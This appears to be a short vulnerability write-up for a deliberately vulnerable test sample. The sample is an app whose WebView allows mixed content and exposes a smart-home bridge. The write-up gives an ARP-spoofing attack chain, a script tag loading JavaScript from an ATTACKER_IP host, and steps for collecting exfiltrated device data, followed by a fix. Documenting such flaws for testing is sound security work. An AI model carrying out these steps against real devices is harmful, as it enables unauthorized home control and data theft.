# 4.2 Insecure Network Content Trust - Mixed Content + HomeAppBridge

## Vulnerability
`settings.mixedContentMode = MIXED_CONTENT_ALWAYS_ALLOW` allows HTTPS pages to load HTTP resources. An attacker performing MITM on the same network can inject malicious JavaScript into HTTP responses, and the injected code has access to `HomeAppBridge.sendCommand()` for unauthorized smart home device control.

## Attack Chain
1. User loads the legitimate HA frontend over HTTPS (normal app flow)
2. HA frontend includes `<script src="http://cdn.home-assistant.io/integrations/widget.js">`
3. Attacker performs ARP spoofing / MITM on the LAN
4. Attacker intercepts the HTTP request for widget.js and injects malicious JS
5. Injected JS calls `HomeAppBridge.sendCommand(deviceId, maliciousCommand)` 
6. Device state changed without user consent → data exfiltrated via `getDeviceState()`

> **Note**: This sample has NO deeplink entry. The attack relies on MITM of mixed HTTP content within a legitimate HTTPS page. `HomeAppBridge` is registered during normal WebView initialization.

## Exploit (MITM Verification)
1. Start EXP server: `python server.py` (serves malicious widget.js on `/integrations/widget.js`)
2. Set up a test HTTPS page that includes `<script src="http://<ATTACKER_IP>:8000/integrations/widget.js"></script>`
3. Load the test HTTPS page in the app (normal HA server flow)
4. The injected JS calls `HomeAppBridge.getDeviceState()` / `sendCommand()`
5. Check `received/` for exfiltrated device data

## Alternative Quick Test
For rapid verification, load the EXP page directly via the app's normal WebView flow (configure HA server to point to the test HTTPS server).

## Fixed Version
Set `MIXED_CONTENT_NEVER_ALLOW`; restrict HomeAppBridge to trusted origins only.
